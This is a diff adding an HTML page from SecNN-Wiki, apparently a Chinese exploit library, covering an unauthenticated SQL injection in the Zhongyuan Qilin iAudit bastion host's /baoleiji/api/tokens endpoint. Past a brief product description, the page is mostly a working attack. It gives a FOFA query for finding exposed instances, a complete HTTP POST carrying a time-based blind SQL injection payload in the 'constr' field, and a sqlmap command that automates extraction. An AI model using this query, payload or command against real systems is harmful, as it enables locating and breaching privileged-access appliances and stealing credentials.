@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E4%B8%AD%E8%BF%9C%E9%BA%92%E9%BA%9F/%E4%B8%AD%E8%BF%9C%E9%BA%92%E9%BA%9F%E5%A0%A1%E5%9E%92%E6%9C%BAtokensSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>中远麒麟堡垒机tokensSQL注入漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u4e2d\u8fdc\u9e92\u9e9f\u5821\u5792\u673atokensSQL\u6ce8\u5165\u6f0f\u6d1e", url: "#_top", children: [
+          ]},
+          {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1", children: [
+          ]},
+          {title: "\u4e8c\u3001\u5f71\u54cd\u7248\u672c", url: "#_2", children: [
+          ]},
+          {title: "\u4e09\u3001\u8d44\u4ea7\u6d4b\u7ed8", url: "#_3", children: [
+          ]},
+          {title: "\u56db\u3001\u6f0f\u6d1e\u590d\u73b0", url: "#_4", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E4%B8%AD%E8%BF%9C%E9%BA%92%E9%BA%9F%E5%A0%A1%E5%9E%92%E6%9C%BA/%E4%B8%AD%E8%BF%9C%E9%BA%92%E9%BA%9F%20iAudit%E5%A0%A1%E5%9E%92%E6%9C%BA%20get_luser_by_sshport.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E4%B8%AD%E8%BF%9C%E9%BA%92%E9%BA%9F%E5%A0%A1%E5%9E%92%E6%9C%BA/%E4%B8%AD%E8%BF%9C%E9%BA%92%E9%BA%9F%20iAudit%E5%A0%A1%E5%9E%92%E6%9C%BA%20get_luser_by_sshport.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        中远麒麟 iAudit堡垒机 get_luser_by_sshport.php 远程命令执行漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E4%B8%AD%E8%BF%9C%E9%BA%92%E9%BA%9F%E5%A0%A1%E5%9E%92%E6%9C%BAadmin_commonuserSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E4%B8%AD%E8%BF%9C%E9%BA%92%E9%BA%9F%E5%A0%A1%E5%9E%92%E6%9C%BAadmin_commonuserSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        中远麒麟堡垒机admin_commonuserSQL注入漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="tokenssql">中远麒麟堡垒机tokensSQL注入漏洞<a class="headerlink" href="#tokenssql" title="Permanent link">&para;</a></h1>
+<h1 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
+<p>中远麒麟依托自身强大的研发能力,丰富的行业经验，自主研发了新一代软硬件一体化统一安全运维平台一-iAudit 统一安全运维平台。该产品支持对企业运维人员在运维过程中进行统一身份认证、统一授权、统一审计、统一监控，消除了传统运维过程中的盲区，实现了运维简单化、操作可控化、过程可视化，是企业 IT 内控最有效的管理平台。中远麒麟堡垒机admin.php接口处存在sql注入漏洞，未经身份认证的攻击者可通过该漏洞获取数据库敏感信息及凭证，最终可能导致服务器失陷。</p>
+<h1 id="_2">二、影响版本<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h1>
+<ul>
+<li>中远麒麟堡垒机</li>
+</ul>
+<h1 id="_3">三、资产测绘<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h1>
+<ul>
+<li>fofa<code>cert.subject="Baolei"</code></li>
+<li>登录页面</li>
+</ul>
+<p><img alt="1694188801127-8a840ce3-9c49-40f2-a25e-7073d268576d.png" src="./img/nE4g5ODj8_AVhbV_/1694188801127-8a840ce3-9c49-40f2-a25e-7073d268576d-879476.png" /></p>
+<h1 id="_4">四、漏洞复现<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h1>
+<div class="highlight"><pre><span></span><code>POST /baoleiji/api/tokens HTTP/1.1
+Host: xx.xx.xx.xx
+Cookie: PHPSESSID=66b53a13d3db0e27a9676d419c374c42
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/117.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: none
+Sec-Fetch-User: ?1
+Te: trailers
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 91
+
+constr=1&#39; AND (SELECT 6999 FROM (SELECT(SLEEP(10)))ptGN) AND&#39;AAdm&#39;=&#39;AAdm&amp;title=%40127.0.0.1
+</code></pre></div>
+<p><img alt="1694189196630-fb35bd59-a136-40d9-933c-3169624d44d8.png" src="./img/nE4g5ODj8_AVhbV_/1694189196630-fb35bd59-a136-40d9-933c-3169624d44d8-112577.png" /></p>
+<p><strong>sqlmap</strong></p>
+<div class="highlight"><pre><span></span><code>sqlmap -u &#39;https://xx.xx.xx.xx/baoleiji/api/tokens&#39; --data=&#39;constr=1&amp;title=%40127.0.0.1&#39;
+</code></pre></div>
+<p><img alt="1694189648421-30ea9bf7-e73f-4b80-8f5e-764869f2c14a.png" src="./img/nE4g5ODj8_AVhbV_/1694189648421-30ea9bf7-e73f-4b80-8f5e-764869f2c14a-633219.png" /></p>
+<blockquote>
+<p>更新: 2024-02-29 23:57:14<br />
+原文: <a href="https://www.yuque.com/xiaokp7/ocvun2/hc0u6hawuz8n4lam">https://www.yuque.com/xiaokp7/ocvun2/hc0u6hawuz8n4lam</a></p>
+</blockquote>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E4%B8%AD%E8%BF%9C%E9%BA%92%E9%BA%9F%E5%A0%A1%E5%9E%92%E6%9C%BA/%E4%B8%AD%E8%BF%9C%E9%BA%92%E9%BA%9F%20iAudit%E5%A0%A1%E5%9E%92%E6%9C%BA%20get_luser_by_sshport.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E4%B8%AD%E8%BF%9C%E9%BA%92%E9%BA%9F%E5%A0%A1%E5%9E%92%E6%9C%BA/%E4%B8%AD%E8%BF%9C%E9%BA%92%E9%BA%9F%20iAudit%E5%A0%A1%E5%9E%92%E6%9C%BA%20get_luser_by_sshport.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        中远麒麟 iAudit堡垒机 get_luser_by_sshport.php 远程命令执行漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E4%B8%AD%E8%BF%9C%E9%BA%92%E9%BA%9F%E5%A0%A1%E5%9E%92%E6%9C%BAadmin_commonuserSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E4%B8%AD%E8%BF%9C%E9%BA%92%E9%BA%9F%E5%A0%A1%E5%9E%92%E6%9C%BAadmin_commonuserSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        中远麒麟堡垒机admin_commonuserSQL注入漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
